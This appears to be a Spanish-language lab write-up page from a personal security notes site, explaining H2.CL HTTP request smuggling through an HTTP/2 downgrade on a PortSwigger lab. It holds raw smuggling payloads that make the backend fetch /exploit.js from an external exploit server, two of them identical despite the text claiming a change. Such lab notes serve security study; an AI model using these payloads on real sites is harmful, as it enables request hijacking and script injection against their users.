@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;La cosa aquí es que HTTP/2 separa en frames las conexiones y les asigna un length, por lo que no se puede explotar HTTP request smuggling, la única forma de hacerlo es con un downgrade.&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p>La cosa aquí es que HTTP/2 separa en frames las conexiones y les asigna un length, por lo que no se puede explotar HTTP request smuggling, la única forma de hacerlo es con un downgrade.</p>
+
+<p>Aprovechar un H2.CL significa que el frontend interpretará y medirá el content length usando la técnica que se usa en HTTP/2  y no entenderá Content-Length, cosa que si entenderá el backend, y así podemos spoofearlo para colarle otra petición al backend.</p>
+
+<p>La cosa aquí es que se cargue un js de un dominio externo :</p>
+
+<p>Esto puede que no funcione porque igual se añaden cabeceras duplicadas y producen fallos.</p>
+
+<pre><code class="language-HTTP">POST /test HTTP/2\r\n
+Host: 0aa0003504478749805e305400be004e.web-security-academy.net\r\n
+Content-Length: 0\r\n
+\r\n
+GET /exploit.js HTTP/1.1\r\n
+Host: exploit-0ab500db040187c880912ff301020053.exploit-server.net\r\n
+X-Ignore: X
+</code></pre>
+
+<p>Mejor hacerlo así a veces para el tema de las cabeceras duplicadas</p>
+
+<pre><code class="language-HTTP">POST /test HTTP/2\r\n
+Host: 0aa0003504478749805e305400be004e.web-security-academy.net\r\n
+Content-Length: 0\r\n
+\r\n
+GET /exploit.js HTTP/1.1\r\n
+Host: exploit-0ab500db040187c880912ff301020053.exploit-server.net\r\n
+Content-Length: 6\r\n
+
+x=
+</code></pre>
+
+<p>Como no funcionaba hosteando un script, lo hice cargando el recurso de resources:</p>
+
+<pre><code class="language-HTTP">POST /test HTTP/2\r\n
+Host: 0aa0003504478749805e305400be004e.web-security-academy.net\r\n
+Content-Length: 0\r\n
+\r\n
+GET /exploit.js HTTP/1.1\r\n
+Host: exploit-0ab500db040187c880912ff301020053.exploit-server.net\r\n
+Content-Length: 6\r\n
+
+x=
+</code></pre>
+
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
